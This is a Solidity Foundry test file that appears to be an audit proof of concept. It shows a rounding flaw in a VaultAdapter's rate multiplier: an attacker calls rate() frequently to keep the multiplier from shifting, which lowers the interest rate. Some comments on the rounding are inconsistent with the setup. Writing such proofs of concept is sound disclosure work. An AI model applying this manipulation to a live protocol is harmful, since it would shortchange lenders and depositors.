// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../../contracts/oracle/libraries/VaultAdapter.sol";
import "../../contracts/access/Access.sol";
import "../../contracts/interfaces/IVault.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// Mock Vault contract for testing
contract MockVault is IVault {
    mapping(address => uint256) private _utilization;
    mapping(address => uint256) private _utilizationIndex;
    
    function setUtilization(address asset, uint256 util) external {
        _utilization[asset] = util;
    }
    
    function setUtilizationIndex(address asset, uint256 index) external {
        _utilizationIndex[asset] = index;
    }
    
    function utilization(address asset) external view returns (uint256) {
        return _utilization[asset];
    }
    
    function currentUtilizationIndex(address asset) external view returns (uint256) {
        return _utilizationIndex[asset];
    }
    
    // Stub implementations for other IVault functions
    function deposit(address, uint256, address) external returns (uint256) { return 0; }
    function withdraw(address, uint256, address, address) external returns (uint256) { return 0; }
    function borrow(address, uint256, address, address) external returns (uint256) { return 0; }
    function repay(address, uint256, address) external returns (uint256) { return 0; }
    function liquidate(address, address, address, uint256, address) external returns (uint256) { return 0; }
    function totalAssets(address) external view returns (uint256) { return 0; }
    function totalBorrowed(address) external view returns (uint256) { return 0; }
    function balanceOf(address, address) external view returns (uint256) { return 0; }
    function borrowBalance(address, address) external view returns (uint256) { return 0; }
}

// Mock AccessControl contract
contract MockAccessControl {
    function hasRole(bytes32, address) external pure returns (bool) {
        return true;
    }
}

contract VaultAdapterExploitTest is Test {
    VaultAdapter public adapter;
    MockVault public vault;
    MockAccessControl public accessControl;
    
    address public asset = address(0x1234);
    address public attacker = address(0xBAD);
    
    uint256 constant RAY = 1e27;
    uint256 constant KINK = 8e26; // 80% utilization
    
    function setUp() public {
        // Deploy mock contracts
        vault = new MockVault();
        accessControl = new MockAccessControl();
        
        // Deploy VaultAdapter implementation
        VaultAdapter implementation = new VaultAdapter();
        
        // Deploy proxy
        bytes memory initData = abi.encodeWithSelector(
            VaultAdapter.initialize.selector,
            address(accessControl)
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);
        adapter = VaultAdapter(address(proxy));
        
        // Set up slopes for the asset
        IVaultAdapter.SlopeData memory slopes = IVaultAdapter.SlopeData({
            slope0: 2e25,  // 2% base rate
            slope1: 5e26,  // 50% slope above kink
            kink: KINK
        });
        adapter.setSlopes(asset, slopes);
        
        // Set limits - rate parameter determines how fast multiplier shifts
        // Setting rate so that multiplier shifts significantly over 24 hours
        uint256 rate = RAY / 86400; // Shift rate per second
        adapter.setLimits(2e27, 5e26, rate); // max 2x, min 0.5x multiplier
        
        // Initialize vault with high utilization (above kink)
        vault.setUtilization(asset, 9e26); // 90% utilization
        vault.setUtilizationIndex(asset, 0);
    }
    
    function testMultiplierDoesNotShiftWithFrequentCalls() public {
        // Step 1: Make initial rate call to set baseline
        vm.warp(1000000);
        uint256 initialRate = adapter.rate(address(vault), asset);
        
        console.log("Initial rate:", initialRate);
        
        // Step 2: Advance time by 23 hours (82800 seconds)
        // With the configured rate, this should cause significant multiplier shift
        vm.warp(block.timestamp + 82800);
        
        // Step 3: Attacker calls rate() to update multiplier
        vm.prank(attacker);
        uint256 rateAfter23Hours = adapter.rate(address(vault), asset);
        
        console.log("Rate after 23 hours:", rateAfter23Hours);
        
        // Step 4: Advance time by another 23 hours
        vm.warp(block.timestamp + 82800);
        
        // Step 5: Attacker calls rate() again
        vm.prank(attacker);
        uint256 rateAfter46Hours = adapter.rate(address(vault), asset);
        
        console.log("Rate after 46 hours:", rateAfter46Hours);
        
        // Step 6: Now compare with what the rate SHOULD be if called only once after 46 hours
        // Reset to initial state
        setUp();
        vm.warp(1000000);
        adapter.rate(address(vault), asset); // Initial call
        
        // Advance full 46 hours without intermediate calls
        vm.warp(block.timestamp + 165600);
        uint256 expectedRate = adapter.rate(address(vault), asset);
        
        console.log("Expected rate after 46 hours (no intermediate calls):", expectedRate);
        
        // VULNERABILITY DEMONSTRATION:
        // The rate with frequent calls should be LOWER than the expected rate
        // because the multiplier doesn't shift properly due to rounding down
        // When (_elapsed * $.rate / 1e27) rounds to 0, the multiplier stays constant
        
        // Calculate the difference - this shows the impact of the vulnerability
        uint256 rateDifference = expectedRate > rateAfter46Hours ? expectedRate - rateAfter46Hours : 0;
        
        console.log("Rate difference (impact of vulnerability):", rateDifference);
        
        // Assert that frequent calls result in lower rate than expected
        // This proves the multiplier is not shifting properly
        assertLt(rateAfter46Hours, expectedRate, "Frequent calls should prevent proper multiplier shift");
        
        // The difference should be significant (more than 1% of expected rate)
        assertGt(rateDifference, expectedRate / 100, "Impact should be significant");
    }
    
    function testMultiplierRoundingToZero() public {
        // This test directly demonstrates the rounding issue
        
        // Step 1: Initialize
        vm.warp(1000000);
        adapter.rate(address(vault), asset);
        
        // Step 2: Advance time by a small amount where (_elapsed * rate / RAY) rounds to 0
        // With rate = RAY / 86400, we need elapsed < 1 second for rounding to 0
        // But even with elapsed = 1, the calculation might round down significantly
        
        uint256 shortInterval = 100; // 100 seconds
        
        // Step 3: Call rate multiple times with short intervals
        for (uint i = 0; i < 10; i++) {
            vm.warp(block.timestamp + shortInterval);
            adapter.rate(address(vault), asset);
        }
        
        uint256 rateWithFrequentCalls = adapter.rate(address(vault), asset);
        
        // Step 4: Compare with single call after same total time
        setUp();
        vm.warp(1000000);
        adapter.rate(address(vault), asset);
        vm.warp(block.timestamp + (shortInterval * 11)); // Total time same as above
        uint256 rateWithSingleCall = adapter.rate(address(vault), asset);
        
        console.log("Rate with frequent calls (100s intervals):", rateWithFrequentCalls);
        console.log("Rate with single call (1100s):", rateWithSingleCall);
        
        // The rates should differ due to rounding in multiplier calculation
        assertNotEq(rateWithFrequentCalls, rateWithSingleCall, "Rates should differ due to rounding");
        assertLt(rateWithFrequentCalls, rateWithSingleCall, "Frequent calls result in lower rate");
    }
}